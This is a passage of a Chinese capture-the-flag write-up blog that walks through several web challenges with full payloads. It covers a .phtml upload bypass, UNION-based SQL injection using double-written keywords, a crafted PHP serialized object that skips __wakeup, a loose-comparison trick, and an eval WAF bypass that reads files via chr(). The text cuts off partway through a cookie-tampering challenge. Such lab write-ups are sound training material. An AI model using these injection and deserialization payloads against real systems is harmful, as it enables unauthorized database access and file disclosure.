不过我们还需要在BP里将.jpg修改为.phtml。同样修改为php7虽然能绕过其对php的过滤，但是没法连接进入。</p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041744518.png">所以在网站后面加入这个后缀就可以连接进去了，老样子，打开虚拟终端，输入代码得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041744414.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><h3 id="一、本题做题思路-10"><a href="#一、本题做题思路-10" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>先看看它是什么闭合方式，通过对比，发现其还是由’闭合</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041744401.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041744416.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑fuzz测试，发现过滤字符，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041744443.png">尝试双写绕过，先看看有几个字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url+/check.php?username=1&#x27; oorrder bbyy 4 --+&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041745244.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">用三回显不同，所以有三个字段，判断一下注入点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url+/check.php?username=1&#x27; uniunionon seleselectct 1,2,3 --+&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041745204.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">发现回显为在第二个字段和第三个字段。来查询一下它里面所有的库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url+/check.php?username=1&#x27; uniunionon seleselectct 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata--+&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041746558.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑 再接下来就是查询表中字段咯，和上面一道sql题一样，不过这次要双写绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url+/check.php?username=1&#x27; uniunionon seleselectct 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name=&#x27;Flag&#x27;--+&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041746538.png"></p><p> 再查询一下字段中的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url+/check.php?username=1&#x27; uniunionon seleselectct 1,2,group_concat(flag) frfromom ctf.Flag--+&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041746488.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><h3 id="一、本题做题思路-11"><a href="#一、本题做题思路-11" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041748182.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">看网上大佬WP这道题是有个猫的，不过我的不知道为什么没刷出来，不过无伤大雅</p><p>按照所给提示，有备份的好习惯，可以扫描目录得到<a href="http://www.zip(可以通过python脚本扫描或者通过kali上dirb工具,记得找个字典.)/">www.zip(可以通过python脚本扫描或者通过kali上Dirb工具，记得找个字典。)</a></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041748172.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 源代码可以看这位 <a href="https://blog.csdn.net/weixin_46685211/article/details/116395600?spm=1001.2014.3001.5502">大佬的博客</a></p><p>得到一个压缩包，里面有着其源代码 </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041749855.png"></p><p>查询一番能得到的线索从class.php和index.php得到</p><p><strong>class.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">   <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">   <span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line">   <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">通过class.php里的__construct，__wakeup,__destruct函数可以判断index.php中的反序列化存在漏洞。先通过class.php的内容构建一个反序列化,构造后的结果如下图。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041750938.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">修改前 O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;Nameusername&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;Namepassword&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;100&quot;</span>;&#125;</span><br><span class="line">修改后 O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;Nameusername&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;Namepassword&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;100&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">修改前</span><br><span class="line">O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Name%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Name%<span class="number">00</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>admin%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Name%<span class="number">00</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22100</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br><span class="line">修改后</span><br><span class="line">O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Name%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Name%<span class="number">00</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>admin%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Name%<span class="number">00</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22100</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">在class.php里，要满足username&#x3D;admin 和 password&#x3D;100从而满足得到flag的条件，而在index.php里，我们知道get传参传的是 <strong>select 。</strong>但<strong>select</strong>要被反序列化才行。而为什么还需要使用<strong>urlencode</strong>对序列化后的**$b<strong>进行，</strong>是因为private序列化后的特使字符如果不使用字符表示会无法显示出来。而当当反序列化字符串，Object的值大于真实属性个数时，会跳过 __wakeup 函数的执行。即第一个”Name”后的数字。**</p><p>最后再使用select传参得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041752862.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-6"><a href="#二、本题知识点-6" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><blockquote><p>__construct()：创建对象时初始化，当一个对象创建时被调用<br> __wakeup() 使用unserialize时触发<br> __sleep() 使用serialize时触发<br> __destruction()：结束时销毁对象，当一个对象销毁时被调用</p></blockquote><p><strong>对由private定义的，尽量使其用字符转化一下，相较于public，private产生的特使字符无法正常显示出来。</strong></p><p><strong>绕过______wakeup() 当反序列化字符串，Object的值大于真实属性个数时，会跳过 __wakeup 函数的执行。即第一个”Name”后的数字</strong>。</p><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><h3 id="一、本题做题思路-12"><a href="#一、本题做题思路-12" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>这题光靠打开页面什么也得不到，只能通过题目得到提示，然后对网站后缀进行搜索找到备份网站。</p><p>通过dirsearch找到备份网站为<strong>url+&#x2F;index.php,bak。</strong>得到一个文件，打开后发现是代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];<span class="comment">//$key=key</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);<span class="comment">//判断$key是不是数字。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;  <span class="variable">$key</span>弱等于字符串<span class="variable">$str</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><blockquote><p><strong>intval()</strong> 函数用于获取变量的整数值。</p><p><strong>intval()</strong> 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p></blockquote><p>所以就需要$key是数字，且能等于$str,因为是弱等于，所以可以构造<strong>payload: url+&#x2F;?key&#x3D;123</strong></p><p><strong>得到flag</strong></p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041754498.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><h3 id="一、本题做题思路-13"><a href="#一、本题做题思路-13" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>光看页面就是简单的计算器</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041754486.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">所以从源代码里面找找线索，找到了一个calc.php。和题主用waf来确保安全，访问calc.php</p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041755628.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041755604.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">源代码如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];  <span class="comment">//get传参</span></span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><strong>preg_match 函数用于执行一个正则表达式匹配。</strong> </p><p>再结合上面所给的提示，所以我们需要用php的字符串解析特性从而达到绕过waf的效果，可以在num前加一个空格(或者加一个+)。</p><blockquote><p>构造payload: url+&#x2F;calc.php? num&#x3D;print_r(scandir(‘&#x2F;‘));</p></blockquote><p>得到的是错误的回显，放入BP查看，发现其把’ ‘给过滤掉了</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041756801.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041756862.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">不过我们还可以通过chr()绕过，chr(47),47就是代表&#x2F;</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041756826.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041756800.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><blockquote><p>所以可以构造为  url+&#x2F;calc.php? num&#x3D;print_r(scandir(chr(47)));</p><p>&#x2F;&#x2F;也可以使用var_dump()代替print_r();</p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041756840.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">在第八个找到我们的目标，因为它把’ ‘过滤了，所以我们只能chr()一个字符一个字符的绕过</p><blockquote><p>构造为 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url+/calc.php? num=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">chr</span>(<span class="number">47</span>).<span class="title function_ invoke__">chr</span>(<span class="number">102</span>).<span class="title function_ invoke__">chr</span>(<span class="number">49</span>).<span class="title function_ invoke__">chr</span>(<span class="number">97</span>).<span class="title function_ invoke__">chr</span>(<span class="number">103</span>).<span class="title function_ invoke__">chr</span>(<span class="number">103</span>)));</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>类似于 url+&#x2F;?calc.php? num&#x3D;print_r(file_get_contents(‘&#x2F;f1agg’));</p></blockquote><p>从而得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041756870.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-7"><a href="#二、本题知识点-7" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><p>(1)、chr绕过，当出现类似于’ ‘和&#x2F;过滤的时候可以考虑通过chr来进行绕过，从而完成所想达到的目的。</p><p>(2)、利用php字符的解析特性从而达到绕过waf的目的。</p><p>*<em>PHP需要将所有参数转换为有效的变量名，因此在解析查询*</em><a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>*<em>时，它会做两件事：</em>*</p><p><strong>(1）删除空白符</strong></p><p><strong>(2）将某些字符转换为下划线（包括空格）</strong></p><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><h3 id="一、本题做题思路-14"><a href="#一、本题做题思路-14" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>打开后发现和上面哪一题界面一模一样,老规矩，从源代码里面找找线索</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041757291.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">发现一个独特的php，访问一下看看能得到什么 </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041757297.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">flag需要money&#x3D;100000000，然后必须是来自CUIT的学生。 </p><p>其界面写出了要得到flag的限制条件，在源代码里面则是有着一串代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">~~~post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;<span class="comment">//判断password是不是数字。</span></span><br><span class="line">&#125;<span class="keyword">elseif</span> (<span class="variable">$password</span> == <span class="number">404</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">看到cookie等于0,考虑到计算机的世界只有俩个数字(滑稽)。尝试改成1后再传password的参试试。 </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041758517.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041758605.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">修改后需要我们满足另一个条件了足够的钱，根据上面代码所表示，钱是$money。发现如果直接传money&#x3D;100000000会出现如下图的结果。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041758662.png"><img 